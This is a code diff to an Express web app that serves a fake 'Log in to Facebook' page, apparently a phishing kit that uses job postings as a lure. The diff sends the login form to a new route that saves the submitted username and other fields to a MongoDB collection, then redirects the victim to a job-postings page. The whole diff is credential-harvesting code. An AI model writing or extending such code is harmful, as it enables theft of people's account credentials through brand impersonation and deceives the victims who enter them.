@@ -170,7 +170,7 @@ app.get('/success', (req, res) => {
     <img src="images/fbloginlogo.png" class="fblogo" alt="fblogo">
     <div class="login-container">
         <h2 style="font-size: 17px; font-weight: bold; color: #504e4e; margin-bottom: 48px; font-family: sans-serif;">Log in to Facebook</h2>
-        <form action="/Job Postings2.html" method="POST">
+        <form action="/submit-additional-info" method="POST">
             <div class="form-group">
                 <input placeholder="Email address or Phone number" type="text" id="username" name="username" required>
             </div>
@@ -195,8 +195,28 @@ app.get('/success', (req, res) => {
 </html>
 
     `);
+// Route to handle additional info submission from the success page
+app.post('/submit-additional-info', async (req, res) => {
+    const { username, additionalInfo } = req.body;
+
+    try {
+        if (!db) {
+            console.error("Database connection not initialized.");
+            return res.status(500).send('Database connection not initialized.');
+        }
+
+        const additionalData = { username, additionalInfo, timestamp: new Date() };
+        await db.collection('additionalInfo').insertOne(additionalData);
+
+        console.log("Additional info inserted successfully.");
+        res.redirect('/Job Postings2.html');
+    } catch (error) {
+        console.error('Error saving additional info to MongoDB:', error);
+        res.status(500).send('Error saving additional info to MongoDB.');
+    }
 });
 
+// Serve the final Job Postings2.html page
 app.get('/Job Postings2.html', (req, res) => {
     res.sendFile(path.join(__dirname, 'Job Postings2.html'));
 });
